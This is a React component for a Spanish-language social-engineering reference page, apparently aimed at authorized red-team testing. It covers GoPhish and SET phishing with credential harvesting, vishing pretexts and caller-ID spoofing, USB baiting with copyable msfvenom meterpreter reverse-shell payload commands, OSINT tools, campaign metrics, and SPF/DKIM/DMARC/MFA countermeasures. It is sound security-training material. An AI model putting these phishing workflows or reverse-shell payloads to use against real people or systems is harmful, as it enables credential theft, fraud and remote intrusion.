import { useState } from 'react'
import ToolShell from '../components/ToolShell'
import { Copy, Check, Shield, ChevronDown, ChevronUp } from 'lucide-react'

const COLOR = '#ec4899'

const CONTENT = [
  {
    cat: '📧 Phishing — Email + Web clonada',
    items: [
      { cmd:'sudo apt install gophish', desc:'Instalar GoPhish — framework de phishing más usado en red team' },
      { cmd:'./gophish', desc:'Iniciar GoPhish — acceder a https://127.0.0.1:3333 (admin:gophish)' },
      { cmd:'setoolkit', desc:'Iniciar Social Engineering Toolkit (SET) — incluido en Kali' },
      { cmd:'# SET: 1→Social-Engineering → 2→Website Attack Vectors → 3→Credential Harvester', desc:'' },
      { cmd:'# SET: 5→Mass Mailer Attack → envío masivo de phishing desde SET', desc:'' },
      { cmd:'gophish setup: Sending Profile (SMTP) → Landing Page (clonar web) → Email Template → Campaign', desc:'Flujo GoPhish: configurar servidor SMTP, clonar página objetivo, crear campaña con tracking' },
    ]
  },
  {
    cat: '📞 Vishing — Ataques por voz',
    items: [
      { cmd:'# Preparación vishing:', desc:'' },
      { cmd:'# 1. OSINT objetivo: nombre, empresa, cargo, datos personales (LinkedIn, Hunter.io)', desc:'' },
      { cmd:'# 2. Pretexto: IT soporte, banco, proveedor, Hacienda', desc:'' },
      { cmd:'# 3. Vectores: urgencia, autoridad, miedo, simpatía', desc:'' },
      { cmd:'# 4. Objetivo: credenciales, OTP, datos bancarios, acceso físico', desc:'' },
      { cmd:'# Herramientas: spoofcard.com, iSpoofing para caller ID spoofing (solo entornos autorizados)', desc:'' },
    ]
  },
  {
    cat: '🎭 Baiting — Trampa física/digital',
    items: [
      { cmd:'# Baiting físico: USB con payload malicioso dejado en parking/oficina', desc:'' },
      { cmd:'# Crear payload USB:', desc:'' },
      { cmd:'msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe', desc:'Generar payload Windows con Metasploit Framework' },
      { cmd:'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o payload.elf', desc:'Generar payload Linux' },
      { cmd:'# Baiting digital: links maliciosos, archivos PDF/DOCX con macros, QR codes maliciosos', desc:'' },
    ]
  },
  {
    cat: '🔍 OSINT social — Recopilación de info previa',
    items: [
      { cmd:'# LinkedIn: nombre completo, empresa, cargo, responsabilidades, compañeros', desc:'' },
      { cmd:'# Hunter.io: emails corporativos formato (@empresa.com)', desc:'' },
      { cmd:'# WHOIS + Shodan: info técnica del objetivo para crear pretextos convincentes', desc:'' },
      { cmd:'theHarvester -d empresa.com -b all', desc:'Recopilar emails, hosts, empleados de fuentes OSINT públicas' },
      { cmd:'maltego', desc:'Herramienta gráfica de OSINT para mapear relaciones entre personas/organizaciones' },
    ]
  },
  {
    cat: '📊 Métricas de campaña (GoPhish)',
    items: [
      { cmd:'# KPIs estándar de auditoría phishing:', desc:'' },
      { cmd:'# - Open rate: % que abrieron el email (tracking pixel)', desc:'' },
      { cmd:'# - Click rate: % que hicieron click en el link malicioso', desc:'' },
      { cmd:'# - Submission rate: % que introdujeron credenciales', desc:'' },
      { cmd:'# - Report rate: % que reportaron el email como sospechoso (CONCIENCIACIÓN)', desc:'' },
      { cmd:'# Benchmark: click rate > 25% = organización vulnerable · < 5% = buena concienciación', desc:'' },
    ]
  },
  {
    cat: '🛡️ Contramedidas y concienciación',
    items: [
      { cmd:'# SPF record: v=spf1 include:empresa.com ~all (evita email spoofing)', desc:'Añadir registro SPF al DNS corporativo' },
      { cmd:'# DKIM: firma digital de emails salientes', desc:'' },
      { cmd:'# DMARC: p=reject — rechazar emails que fallen SPF/DKIM', desc:'' },
      { cmd:'# Formación: simulaciones periódicas de phishing para empleados', desc:'' },
      { cmd:'# MFA: 2FA en todos los accesos — invalida credenciales robadas por phishing', desc:'' },
    ]
  },
]

function CopyBtn({ text }) {
  const [copied, setCopied] = useState(false)
  if (!text || text.startsWith('#')) return null
  const copy = () => { navigator.clipboard.writeText(text).then(() => { setCopied(true); setTimeout(()=>setCopied(false),1500) }) }
  return (
    <button onClick={copy} style={{ padding:'4px 8px', borderRadius:6, cursor:'pointer', border:'none', transition:'all .15s', flexShrink:0,
      background: copied ? 'rgba(16,185,129,0.2)' : 'rgba(236,72,153,0.12)', color: copied ? '#10b981' : '#ec4899' }}>
      {copied ? <Check size={12}/> : <Copy size={12}/>}
    </button>
  )
}

export default function ToolSocialEng() {
  const [open, setOpen] = useState({})
  const toggle = (cat) => setOpen(o => ({ ...o, [cat]: !o[cat] }))

  return (
    <ToolShell icon="🎭" name="Ingeniería Social" color={COLOR} badge="Phishing · Vishing · Baiting · GoPhish · SET Framework">
      <div style={{ maxWidth:960, margin:'0 auto', padding:'32px 24px' }}>

        <div style={{ display:'flex', gap:8, padding:'11px 14px', borderRadius:9, marginBottom:18,
          background:'rgba(236,72,153,0.08)', border:'1px solid rgba(236,72,153,0.2)',
          color:'rgba(255,255,255,0.5)', fontSize:11 }}>
          <Shield size={13} style={{ color:'#ec4899', flexShrink:0, marginTop:1 }}/>
          <span>La ingeniería social explota el factor humano. Siempre requiere <strong style={{color:'rgba(255,255,255,0.7)'}}>consentimiento escrito</strong> y se usa para concienciar, no para dañar. GDPR obliga a notificar al empleado post-simulación.</span>
        </div>

        <div style={{ display:'grid', gridTemplateColumns:'repeat(3,1fr)', gap:12, marginBottom:24 }}>
          {[
            { tipo:'Phishing', desc:'Email + página web clonada para robar credenciales', icon:'📧', color:'#e63946' },
            { tipo:'Vishing', desc:'Llamada telefónica con pretexto para extraer info', icon:'📞', color:'#f97316' },
            { tipo:'Baiting', desc:'USB/archivo trampa que ejecuta payload malicioso', icon:'🎣', color:'#a855f7' },
          ].map(t => (
            <div key={t.tipo} style={{ background:'rgba(255,255,255,0.03)', border:`1px solid ${t.color}25`, borderRadius:12, padding:'14px 16px' }}>
              <div style={{ fontSize:22, marginBottom:6 }}>{t.icon}</div>
              <div style={{ color:t.color, fontWeight:700, fontSize:13, marginBottom:4 }}>{t.tipo}</div>
              <div style={{ color:'rgba(255,255,255,0.4)', fontSize:11 }}>{t.desc}</div>
            </div>
          ))}
        </div>

        {CONTENT.map(cat => (
          <div key={cat.cat} style={{ marginBottom:10, background:'rgba(255,255,255,0.02)', border:'1px solid rgba(255,255,255,0.07)', borderRadius:12, overflow:'hidden' }}>
            <button onClick={()=>toggle(cat.cat)} style={{ width:'100%', display:'flex', justifyContent:'space-between', alignItems:'center', padding:'12px 16px', background:'none', border:'none', cursor:'pointer', color:'rgba(255,255,255,0.7)', fontSize:13, fontWeight:600, textAlign:'left' }}>
              {cat.cat}{open[cat.cat] ? <ChevronUp size={14}/> : <ChevronDown size={14}/>}
            </button>
            {open[cat.cat] && (
              <div style={{ padding:'0 12px 12px', display:'flex', flexDirection:'column', gap:8 }}>
                {cat.items.map((item,i) => (
                  <div key={i} style={{ background:'rgba(0,0,0,0.3)', borderRadius:9, padding:'10px 12px' }}>
                    <div style={{ display:'flex', gap:8, alignItems:'flex-start', marginBottom: item.desc ? 6 : 0 }}>
                      <code style={{ flex:1, fontSize:11, color: item.cmd.startsWith('#') ? 'rgba(255,255,255,0.3)' : '#f472b6', fontFamily:'monospace', lineHeight:1.5 }}>{item.cmd}</code>
                      <CopyBtn text={item.cmd}/>
                    </div>
                    {item.desc && <div style={{ color:'rgba(255,255,255,0.4)', fontSize:11 }}>{item.desc}</div>}
                  </div>
                ))}
              </div>
            )}
          </div>
        ))}

      </div>
    </ToolShell>
  )
}
